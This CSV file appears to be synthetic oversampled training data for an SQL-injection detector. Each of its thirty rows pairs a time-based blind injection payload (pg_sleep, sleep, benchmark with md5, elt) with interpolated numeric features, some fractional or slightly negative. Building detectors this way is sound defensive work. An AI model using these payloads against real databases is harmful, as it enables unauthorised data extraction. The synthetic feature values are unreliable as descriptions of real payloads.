id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000252,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,4.821061349747453,65.50361861437048,24.496381385629512,3.736703794760146,20.98552554251805,10.992762771259025,24.021711686222922,9.503618614370486,0.3206237604039982,0.1679454910861051,0.3663951675297692,0.1450355809801276,1.4963813856295132,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.0072372287409737,0.5036186143704869,0.5036186143704869,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5036186143704868,0.0,0.49638138562951306,0.5036186143704869,0.0,0.5036186143704869,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.49638138562951306,0.49638138562951306,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000253,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.668675849298389,72.57199824832956,24.26199970805493,3.414789149942489,19.130999854027465,10.0,32.30999854027464,11.130999854027465,0.2641155647238568,0.13817750169976317,0.44413337021233373,0.15357356336404626,0.13099985402746406,0.8690001459725358,2.0,0.0,0.0,1.0,0.0,5.261999708054928,0.8690001459725358,1.0,0.0,3.0,0.1309998540274641,0.8690001459725358,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.13099985402746406,0.8690001459725358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000254,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.8324818901485098,73.49453078328702,24.53454231070436,3.4869014958460554,19.890903851173935,11.425446161878295,31.356361540469575,10.821819229765213,0.2702333203895436,0.15348158569353584,0.4279985443399241,0.14828654957699633,0.0,1.0,2.0,0.0,0.0,1.1781807702347868,0.0,4.821819229765214,0.8218192297652134,1.0,0.0,3.178180770234787,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.17818077023478676,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.178180770234787
SMOTE_000255,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,0.15746607593645343,90.34792497265754,28.0,3.612066345409503,25.217453107910963,18.0,37.08698124316439,10.043490621582192,0.2790105051468876,0.19928994903539277,0.41053912561184414,0.1111604202058755,0.0,0.043490621582192635,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.043490621582192746,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9565093784178073,0.043490621582192746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000256,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,1.893311466230941,89.15491845067734,24.615317596832664,3.105094511115802,30.0,2.0,44.38555364434268,12.769364806334668,0.3389743758646318,0.022598291724308786,0.49506622038505854,0.14336111202600088,0.3846824031673343,0.6153175968326657,0.0,0.0,1.0,0.0,0.0,9.154047209502004,0.6153175968326656,0.0,0.0,1.0000000000000002,0.38468240316733426,0.6153175968326656,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000257,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,2.3779979573236742,57.812683682898914,23.593658158550543,3.6351044135736115,19.21902552434837,10.0,22.0,6.593658158550543,0.33210114439359995,0.17302205268242962,0.3806485159013452,0.11422828702262519,0.40634184144945723,0.5936581585505427,1.1873163171010856,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.187316317101086,0.4063418414494572,0.5936581585505427,0.5936581585505428,0.4063418414494572,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5936581585505428,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.593658158550543
SMOTE_000258,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.9889542023289286,68.74893606429585,23.624822677382642,3.4605421801965273,19.0,10.0,29.499290709530566,10.249645354765283,0.2768732859758134,0.1457227820925334,0.42865278924886213,0.14875114268279105,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.6248226773826415,0.6248226773826413,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000259,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,0.5514196757710844,73.83494183941269,26.58735459853172,3.8041729281097223,18.66988367882538,21.66988367882538,25.41264540146828,8.082529080293655,0.25276041615695133,0.2933938948509758,0.34434350858170704,0.1095021804103658,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0825290802936554,0.0,4.0,0.0,0.0,1.0,3.0825290802936554,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9174709197063445,0.0,0.0,0.0,0.08252908029365547,0.0,0.9174709197063446,0.08252908029365547,0.0,0.0,0.0,0.0,0.0,0.0,0.08252908029365547,0.9174709197063445,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0825290802936554
SMOTE_000260,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.5251498881983399,92.62835265761908,27.887064412267577,3.8407370332216333,19.887064412267577,29.0965152981406,32.98357971040818,10.661193236802726,0.21574737781124298,0.31370104887550276,0.35562959916496845,0.11492197414828578,0.887064412267575,-1.1102230246251565e-16,2.0,0.0,0.0,1.887064412267575,0.0,4.887064412267575,0.0,0.0,1.0,3.8870644122675753,0.887064412267575,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8870644122675753,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8870644122675753
SMOTE_000261,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,3.9884865250377257,60.3891226668176,24.4236403333522,3.760938944940572,20.118201666760996,10.8472806667044,21.5763596666478,7.847280666704399,0.33191181835429423,0.17932625407124825,0.35932302357056345,0.12943890400389407,0.8472806667043989,0.5763596666478005,2.0,0.0,0.0,1.0,0.0,2.5763596666478006,0.0,0.0,0.0,3.0,0.4236403333521994,0.5763596666478006,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5763596666478006,0.0,0.0,0.0,0.0,0.0,0.0,0.5763596666478005,0.0,0.4236403333521993,0.4236403333521993,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000262,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.020931466275852264,58.014653520512965,21.008373440293123,3.334026586166647,15.01674688058625,10.004186720146564,24.991626559706873,8.002093360073282,0.25882003083986954,0.17243933542794987,0.4308084887135741,0.1379321450186065,0.00418672014656285,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.9958132798534374,0.0,0.0,0.9979066399267187,3.0,0.002093360073281425,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0020933600732812585,0.0,0.9979066399267187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9979066399267186,0.0,0.0020933600732812967,0.0020933600732812967,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0020933600732813
SMOTE_000263,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,2.408368935913406,86.32455587864291,23.09273025104083,3.254459893689936,34.278190753122495,1.4768174372397933,39.523182562760205,11.046365125520415,0.3940233435272459,0.01769694647946886,0.46041564491506504,0.12786406507822018,1.5695476882806236,0.4768174372397921,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.5231825627602078,0.47681743723979214,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000264,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,1.2936525747993055,63.16060747816239,25.300506231801993,3.7923815751033905,21.88080997088319,10.0,21.559595014558404,9.720202492720798,0.34527959755894105,0.1585112945092608,0.34252190837562707,0.1536871995561711,2.580303739081196,-1.1102230246251565e-16,0.2797975072792025,0.0,0.0,1.0,0.0,3.1398987536396015,0.0,0.0,0.13989875363960125,3.0,0.8601012463603988,0.0,0.13989875363960125,0.8601012463603988,0.0,1.0,1.0,0.0,0.0,0.0,0.8601012463603988,0.8601012463603988,0.0,0.860101246360399,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7202024927207975
SMOTE_000265,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.821189817722952,60.125658914544374,23.609292635681953,3.584142692514659,18.390707364318047,10.0,23.953536821590234,7.7814147286360935,0.3066149687730985,0.16700227013618252,0.3974594069394513,0.12892335415126766,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.3907073643180463,0.0,0.39070736431804653,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3907073643180464,0.0,0.6092926356819537,0.3907073643180464,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6092926356819536,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000266,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.05612757258650518,58.10447910505587,21.04749050229812,3.3359474615587197,15.075984803676995,10.0,25.028494301378874,8.0,0.2593303178504317,0.17215272587442312,0.43079477557560664,0.13772218069953848,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.009498100459624403,0.9905018995403756,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.009498100459624292,0.0,0.0,0.009498100459624403,0.9905018995403756,0.009498100459624403,0.0,0.0,0.0,0.0,0.0,0.0,0.9905018995403756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0094981004596244
SMOTE_000267,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,0.0645080827561551,58.977954284565406,23.011022857717297,3.624755599436491,20.96693142684811,10.0,22.0,6.011022857717297,0.3554897157919016,0.16955707914194051,0.3730255741122691,0.10192763095388882,0.9889771422827034,0.011022857717296608,0.022045715434593216,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0220457154345932,0.9889771422827034,0.011022857717296608,0.011022857717296608,0.9889771422827034,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.011022857717296608,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011022857717297
SMOTE_000268,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,2.209242482021919,74.10737487803091,24.953808809180106,3.405183477842313,19.47690440459005,10.0,33.67666166426075,10.953808809180106,0.2655048499489515,0.13671527039424808,0.44957293686279204,0.1482069427940084,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.43071321377016,0.5230955954099467,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.47690440459005334,0.5230955954099465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000269,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,0.2971531787741645,72.11378291181171,23.22756582362341,3.514255476571486,17.113782911811708,19.17067436771756,27.82932563228244,8.0,0.23728567195000821,0.2657895418827406,0.38598452026907054,0.11094026589818061,0.0,-1.1102230246251565e-16,0.1137829118117063,0.0,0.0,1.0,0.0,4.943108544094147,0.0,0.0,1.0,1.1137829118117066,0.0,0.0,0.05689145590585315,0.9431085440941469,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.056891455905853205,0.9431085440941467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000270,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,3.0837157398714146,75.52434287856236,22.198657152674418,3.368097217051456,29.325685725887947,6.071628579460886,30.563514286606765,9.563514286606765,0.3842192369986273,0.07256500919880206,0.41433000739173825,0.12888574641083236,0.0,3.563514286606765,0.0,0.0,0.0,1.0,0.0,4.4364857133932345,0.0,0.5635142866067653,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5635142866067652,1.5635142866067653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4364857133932348,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.563514286606765
SMOTE_000271,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.2278003898865115,57.238466743322604,23.28459977003217,3.5685094239245387,17.28459977003217,10.0,22.71540022996783,7.23846674332261,0.30215661993709214,0.17471728147815302,0.39671250597551994,0.12641359260923488,0.0,0.7615332566773898,2.0,0.0,0.0,1.0,0.0,3.23846674332261,0.0,0.0,0.2384667433226102,3.0,0.0,0.7615332566773898,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7615332566773898,0.0,0.2384667433226102,0.7615332566773898,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7615332566773896
SMOTE_000272,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,1.1084208940531302,85.89271686167066,26.357086744668266,3.6751978957535174,29.928739765995203,11.428346978673064,33.71417348933653,10.821456627665867,0.34918544541147734,0.13235063066281094,0.3923196196285586,0.12614430429715312,3.285826510663468,-1.1102230246251565e-16,0.35708674466826595,0.0,0.0,2.0,0.0,4.178543372334133,0.0,1.0,0.0,2.357086744668266,0.821456627665867,0.0,0.17854337233413298,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.17854337233413298,1.0,1.8214566276658672,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000273,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.120490207746954,75.2183240729355,25.084508714463,3.384824347160047,19.5422543572315,10.0,34.591561001241,11.084508714463,0.2624389613347033,0.13468725068832513,0.4551201672348754,0.1477536207420962,1.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,5.6267630716945,0.45774564276850005,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5422543572315,0.4577456427685,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.497148675149915,87.84659718318521,27.38474205233863,3.497534186352662,23.46185513084658,15.538968209354529,38.23051589532274,10.615257947661368,0.266452748620691,0.1755379370206926,0.4366027221956082,0.12140659216300817,0.3076289738306841,-1.1102230246251565e-16,2.0,0.0,0.0,1.692371026169316,0.0,5.615257947661368,0.0,1.0,0.0,3.692371026169316,0.30762897383068405,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6923710261693159,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.692371026169316
SMOTE_000275,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.4735057796607319,58.921143130864884,21.13159187583784,3.343440101092114,15.131591875837842,10.592163441270285,25.197387813756762,8.0,0.2571396508227063,0.17843248282687446,0.42826147388081176,0.1361663924696075,0.0,-1.1102230246251565e-16,1.8684081241621588,0.0,0.0,1.0,0.0,4.065795937918921,0.0,0.0,1.0,2.8684081241621593,0.0,0.0,0.9342040620810794,0.06579593791892055,0.0,1.0,1.0,0.0,0.0,0.06579593791892051,0.0,0.0,0.0,0.0,0.0,0.9342040620810795,0.06579593791892047,0.0,0.0,0.0,0.0,0.0,0.0,0.9342040620810794,0.06579593791892051,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.19058712331323005,83.61957486798357,24.96127657075103,3.2228574398694114,30.0,2.0,39.54212800948562,12.077446858497947,0.35918373542174675,0.02394558236144978,0.4724148965481255,0.14445578566867795,0.03872342924897321,0.9612765707510269,0.0,0.0,1.0,0.0,0.0,8.116170287746918,0.9612765707510269,0.0,0.0,1.0000000000000002,0.038723429248973096,0.9612765707510268,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000277,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,2.048453758742357,90.98835231832042,22.25833746050444,2.9155017975631083,28.955002476302663,2.0,47.77501238151332,12.258337460504439,0.3212247043599616,0.022331644785135468,0.5230387497207385,0.13340490113416448,0.6516674921008879,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,9.955002476302663,0.0,0.0,0.0,1.0000000000000002,0.6516674921008879,0.0,0.0,0.6516674921008879,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.348332507899112
SMOTE_000278,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,0.20493508836050645,93.12634168475965,24.90524373643026,3.4219655187616955,39.62097494572105,1.031585421189913,40.410610475468864,12.063170842379826,0.42563984065643184,0.011064305784935391,0.43378041312805876,0.12951544043057397,2.905243736430262,0.031585421189912366,0.0,0.0,1.0,0.0,0.0,8.094756263569737,0.0,0.0,0.0,1.0000000000000002,0.9684145788100874,0.03158542118991248,0.0,0.03158542118991245,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000279,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.3839011355386313,65.35423368746311,23.354233687463115,3.514790342646328,19.0,10.0,27.0,9.354233687463115,0.2907388251604198,0.1530204342949578,0.413155172596386,0.14308556794823646,0.3542336874631139,0.645766312536886,2.0,0.0,0.0,1.0,0.0,4.0,0.3542336874631139,1.0,0.0,3.0,0.354233687463114,0.645766312536886,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.06546022700675176,94.82752418552596,27.942508061841988,3.835628812423537,19.95209005153499,29.885016123683975,34.0,10.990418010306998,0.2103756761702399,0.31500352784472985,0.35869640159837557,0.11592439438665471,0.990418010306998,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.990418010306998,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9904180103069982,0.0,0.0,0.0,1.0,0.0,0.990418010306998,0.009581989693001947,0.0,0.0,0.0,0.0,0.0,0.0,0.009581989693001891,0.9904180103069982,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000281,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.232653509021647,96.24007390681325,22.569944569890065,2.9289018353276965,30.279778279560265,1.8100184767033127,50.530240197143044,13.620036953406622,0.3155322496094196,0.01874422396924895,0.5242998982442937,0.14142362817703769,0.5699445698900659,0.8100184767033112,0.0,0.0,1.0,0.0,0.0,10.430055430109935,0.0,0.0,0.0,1.0000000000000002,0.18998152329668883,0.8100184767033112,0.0,0.8100184767033114,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
